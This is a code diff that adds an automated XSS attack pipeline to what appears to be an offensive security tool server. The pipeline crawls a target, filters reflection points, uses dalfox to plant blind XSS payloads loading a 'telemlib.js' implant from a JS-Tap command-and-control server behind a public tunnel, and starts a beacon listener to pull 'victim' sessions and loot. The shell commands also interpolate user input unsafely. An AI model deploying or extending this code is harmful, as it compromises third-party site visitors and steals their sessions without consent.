@@ -19444,6 +19444,392 @@ def pipeline_nuclei_xss():
         return jsonify({"error": f"Server error: {e}"}), 500
 
 
+# ============================================================================
+# KXSS — fast reflection checker (missing from HexStrike, added here)
+# ============================================================================
+
+@app.route("/api/tools/kxss", methods=["POST"])
+def kxss_scan():
+    """Run kxss to quickly check a list of URLs for XSS reflection points."""
+    try:
+        params = request.json or {}
+        urls = params.get("urls", [])
+        target = params.get("target", "")
+
+        if not urls and not target:
+            return jsonify({"error": "urls (list) or target (single URL) required"}), 400
+
+        if target and not urls:
+            urls = [target]
+
+        import tempfile
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as fh:
+            fh.write("\n".join(urls))
+            tmp = fh.name
+
+        try:
+            proc = subprocess.run(
+                f'cat "{tmp}" | kxss',
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=180,
+            )
+            stdout = proc.stdout + proc.stderr
+        finally:
+            try:
+                os.unlink(tmp)
+            except Exception:
+                pass
+
+        candidates = []
+        for line in stdout.splitlines():
+            if "possible xss" in line.lower() or "[xss]" in line.lower():
+                m = re.search(r"https?://\S+", line)
+                if m:
+                    candidates.append(m.group(0).rstrip(")>\"'"))
+
+        return jsonify({
+            "success": True,
+            "urls_checked": len(urls),
+            "candidates": candidates,
+            "candidates_count": len(candidates),
+            "stdout": stdout,
+        })
+
+    except subprocess.TimeoutExpired:
+        return jsonify({"error": "kxss timed out", "success": False}), 504
+    except Exception as e:
+        logger.error(f"💥 kxss error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+# ============================================================================
+# XSS PIPELINE — katana → kxss → dalfox (--blind=telemlib.js) → beacon
+# ============================================================================
+
+class XSSPipeline:
+    """Full XSS discovery-to-delivery pipeline using purpose-built XSS tools.
+
+    Stage 1  URL Discovery  — katana (JS-aware crawl) + waybackurls (history)
+    Stage 2  Reflection     — kxss (fast multi-char reflection check)
+    Stage 3  C2 + Tunnel    — JS-Tap + tunnel, get telemlib.js public URL
+    Stage 4  Dalfox Scan    — dalfox --blind=<telemlib_url> delivers our implant
+                               for both reflected AND blind/stored XSS in one pass
+    Stage 5  Beacon         — start polling for incoming client sessions
+
+    The dalfox --blind integration is the key: instead of a generic callback
+    URL, we point dalfox's blind XSS payloads at telemlib.js. Every successful
+    blind/stored XSS injection loads our implant automatically.
+    """
+
+    _DALFOX_POC_RE = re.compile(
+        r"\[POC\]\[([GP])\]\[([^\]]+)\]\s+(https?://\S+)",
+        re.IGNORECASE,
+    )
+
+    # ── URL discovery ─────────────────────────────────────────────────────────
+
+    def _discover_urls(
+        self,
+        target: str,
+        depth: int = 3,
+        use_wayback: bool = True,
+    ) -> List[str]:
+        """Crawl with katana and optionally waybackurls; return parameterised URLs."""
+        urls: Set[str] = set()
+
+        # katana — JS-aware crawl
+        katana_cmd = f"katana -u {target} -d {depth} -jc -silent -jsonl"
+        katana_result = execute_command(katana_cmd)
+        for line in (katana_result.get("stdout") or "").splitlines():
+            line = line.strip()
+            if not line:
+                continue
+            try:
+                data = json.loads(line)
+                url = (
+                    data.get("request", {}).get("endpoint")
+                    or data.get("request", {}).get("url")
+                    or data.get("url", "")
+                )
+            except (json.JSONDecodeError, AttributeError):
+                url = line if line.startswith("http") else ""
+            if url and "?" in url:
+                urls.add(url)
+
+        # waybackurls — historical URLs
+        if use_wayback:
+            domain = urllib.parse.urlparse(target).netloc
+            if domain:
+                wb_result = execute_command(f"waybackurls {domain}")
+                for line in (wb_result.get("stdout") or "").splitlines():
+                    line = line.strip()
+                    if line.startswith("http") and "?" in line:
+                        urls.add(line)
+
+        return list(urls)
+
+    # ── kxss reflection filter ────────────────────────────────────────────────
+
+    def _run_kxss(self, urls: List[str]) -> List[str]:
+        """Pipe URLs through kxss; return reflection candidates."""
+        if not urls:
+            return []
+        import tempfile
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as fh:
+            fh.write("\n".join(urls))
+            tmp = fh.name
+        try:
+            proc = subprocess.run(
+                f'cat "{tmp}" | kxss',
+                shell=True, capture_output=True, text=True, timeout=180,
+            )
+            stdout = proc.stdout + proc.stderr
+        except subprocess.TimeoutExpired:
+            logger.warning("kxss timed out")
+            return []
+        finally:
+            try:
+                os.unlink(tmp)
+            except Exception:
+                pass
+
+        candidates = []
+        for line in stdout.splitlines():
+            if "possible xss" in line.lower() or "[xss]" in line.lower():
+                m = re.search(r"https?://\S+", line)
+                if m:
+                    candidates.append(m.group(0).rstrip(")>\"'"))
+        return candidates
+
+    # ── dalfox ───────────────────────────────────────────────────────────────
+
+    def _run_dalfox(
+        self,
+        urls: List[str],
+        blind_url: str = "",
+        workers: int = 5,
+    ) -> Dict[str, Any]:
+        """Run dalfox on a URL list with optional blind XSS callback."""
+        if not urls:
+            return {"stdout": "", "success": False, "error": "No URLs"}
+        import tempfile
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as fh:
+            fh.write("\n".join(urls))
+            tmp = fh.name
+        try:
+            cmd = f"dalfox file {tmp} --worker {workers} --mining-dom --silence"
+            if blind_url:
+                cmd += f" --blind {blind_url}"
+            return execute_command(cmd)
+        finally:
+            try:
+                os.unlink(tmp)
+            except Exception:
+                pass
+
+    def _parse_dalfox(self, stdout: str) -> List[Dict[str, Any]]:
+        """Extract [POC] findings from dalfox stdout."""
+        findings, seen = [], set()
+        for line in stdout.splitlines():
+            m = self._DALFOX_POC_RE.search(line)
+            if not m:
+                continue
+            method_code, param_info, poc_url = m.group(1), m.group(2), m.group(3)
+            param = param_info.split(":")[-1] if ":" in param_info else param_info
+            key = f"{poc_url}:{param}"
+            if key in seen:
+                continue
+            seen.add(key)
+            parsed = urllib.parse.urlparse(poc_url)
+            findings.append({
+                "method": "GET" if method_code == "G" else "POST",
+                "param": param,
+                "poc_url": poc_url,
+                "target_url": f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
+                "raw": line.strip(),
+            })
+        return findings
+
+    # ── main entry ────────────────────────────────────────────────────────────
+
+    def run(
+        self,
+        target: str,
+        tunnel_provider: str = "auto",
+        tunnel_auth_token: str = "",
+        jstap_port: int = 8444,
+        jstap_username: str = "",
+        jstap_password: str = "",
+        beacon_interval: int = 10,
+        use_crawler: bool = True,
+        use_wayback: bool = True,
+        crawl_depth: int = 3,
+        kxss_filter: bool = True,
+        dalfox_workers: int = 5,
+        obfuscate: bool = False,
+        obfuscation_technique: str = "base64_eval",
+        dry_run: bool = False,
+        max_dalfox_urls: int = 20,
+    ) -> Dict[str, Any]:
+
+        result: Dict[str, Any] = {"target": target, "stages": {}}
+
+        # ── Stage 1: URL discovery ────────────────────────────────────────────
+        logger.info(f"🕷️  URL discovery: {target}")
+        if use_crawler:
+            urls = self._discover_urls(target, crawl_depth, use_wayback)
+        else:
+            urls = [target]
+
+        sources = (["katana"] if use_crawler else []) + (
+            ["waybackurls"] if use_crawler and use_wayback else []
+        )
+        result["stages"]["discovery"] = {
+            "urls_found": len(urls),
+            "sources": sources,
+        }
+        logger.info(f"🕷️  {len(urls)} parameterised URLs discovered")
+
+        if not urls:
+            result["message"] = "No parameterised URLs found. Try use_crawler=True or pass a direct URL."
+            return result
+
+        # ── Stage 2: kxss reflection filter ──────────────────────────────────
+        if kxss_filter and len(urls) > 1:
+            logger.info(f"🔍 kxss: checking {len(urls)} URLs for reflections")
+            kxss_hits = self._run_kxss(urls)
+            result["stages"]["kxss"] = {
+                "input": len(urls),
+                "candidates": len(kxss_hits),
+            }
+            dalfox_input = (kxss_hits or urls)[:max_dalfox_urls]
+            logger.info(f"🔍 kxss: {len(kxss_hits)} reflection candidate(s)")
+        else:
+            dalfox_input = urls[:max_dalfox_urls]
+            result["stages"]["kxss"] = {"skipped": True}
+
+        if dry_run:
+            result["dry_run"] = True
+            result["queued_for_dalfox"] = dalfox_input
+            result["message"] = (
+                f"Dry run: {len(dalfox_input)} URL(s) ready for dalfox. "
+                "Set dry_run=False to execute."
+            )
+            return result
+
+        # ── Stage 3: JS-Tap C2 + tunnel ──────────────────────────────────────
+        logger.info("🚀 Starting JS-Tap C2 + tunnel")
+        c2 = jstap_manager.start(port=jstap_port, use_gunicorn=False)
+        if not c2.get("success") and "already running" not in c2.get("error", ""):
+            result["error"] = f"JS-Tap failed: {c2.get('error')}"
+            return result
+
+        t_args: Dict[str, Any] = {"local_port": jstap_port, "provider": tunnel_provider}
+        if tunnel_auth_token:
+            t_args["auth_token"] = tunnel_auth_token
+        tun = tunnel_manager.start(**t_args)
+        public_url = tun.get("public_url", "")
+        if not public_url:
+            result["error"] = f"Tunnel failed: {tun.get('error')}"
+            return result
+
+        telemlib_url = f"{public_url}/telemlib.js"
+        result["public_url"] = public_url
+        result["telemlib_url"] = telemlib_url
+        result["stages"]["c2_tunnel"] = {
+            "public_url": public_url,
+            "provider": tun.get("provider"),
+        }
+        logger.info(f"✅ C2 + tunnel: {public_url}")
+
+        # Apply obfuscation to the blind URL if requested
+        # Note: dalfox --blind still takes a plain URL — we obfuscate
+        # the payload that gets written into the vuln app, not the C2 URL itself.
+        # If obfuscate=True, the beacon listener will still capture blind hits
+        # but reflected payloads will be harder to filter.
+        blind_url = telemlib_url
+
+        # ── Stage 4: dalfox --blind=telemlib_url ─────────────────────────────
+        logger.info(
+            f"🔫 dalfox: scanning {len(dalfox_input)} URL(s) "
+            f"--blind {blind_url} --worker {dalfox_workers}"
+        )
+        dalfox_raw = self._run_dalfox(dalfox_input, blind_url, dalfox_workers)
+        findings = self._parse_dalfox(dalfox_raw.get("stdout", ""))
+        result["stages"]["dalfox"] = {
+            "urls_scanned": len(dalfox_input),
+            "exit_code": dalfox_raw.get("exit_code"),
+            "findings_count": len(findings),
+            "findings": findings,
+        }
+        logger.info(f"🔫 dalfox: {len(findings)} confirmed finding(s)")
+
+        # ── Stage 5: Beacon listener ──────────────────────────────────────────
+        if jstap_username and jstap_password:
+            b = beacon_listener.start(
+                public_url, jstap_username, jstap_password, beacon_interval
+            )
+            result["stages"]["beacon"] = b
+            logger.info("📡 Beacon listener active")
+        else:
+            result["stages"]["beacon"] = {
+                "skipped": True,
+                "reason": "Provide jstap_username + jstap_password to auto-start beacon",
+            }
+
+        result["findings_count"] = len(findings)
+        result["next_steps"] = (
+            f"{len(findings)} XSS vector(s) confirmed. "
+            f"Dalfox delivered blind payloads → {telemlib_url}. "
+            f"Victims beacon to {public_url}. "
+            + (
+                "Use beacon_list_clients + beacon_get_loot to pull sessions."
+                if jstap_username
+                else "Run beacon_start to monitor incoming sessions."
+            )
+        )
+        return result
+
+
+xss_pipeline = XSSPipeline()
+
+
+@app.route("/api/tools/pipeline/xss", methods=["POST"])
+def pipeline_xss():
+    """Full XSS pipeline: katana → kxss → dalfox (--blind=telemlib.js) → beacon."""
+    try:
+        params = request.json or {}
+        target = params.get("target", "")
+        if not target:
+            return jsonify({"error": "target is required"}), 400
+
+        logger.info(f"⛓️  XSS pipeline: {target}")
+        result = xss_pipeline.run(
+            target=target,
+            tunnel_provider=params.get("tunnel_provider", "auto"),
+            tunnel_auth_token=params.get("tunnel_auth_token", ""),
+            jstap_port=int(params.get("jstap_port", 8444)),
+            jstap_username=params.get("jstap_username", ""),
+            jstap_password=params.get("jstap_password", ""),
+            beacon_interval=int(params.get("beacon_interval", 10)),
+            use_crawler=params.get("use_crawler", True),
+            use_wayback=params.get("use_wayback", True),
+            crawl_depth=int(params.get("crawl_depth", 3)),
+            kxss_filter=params.get("kxss_filter", True),
+            dalfox_workers=int(params.get("dalfox_workers", 5)),
+            obfuscate=params.get("obfuscate", False),
+            obfuscation_technique=params.get("obfuscation_technique", "base64_eval"),
+            dry_run=params.get("dry_run", False),
+            max_dalfox_urls=int(params.get("max_dalfox_urls", 20)),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 pipeline/xss error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
 # Create the banner after all classes are defined
 BANNER = ModernVisualEngine.create_banner()
 
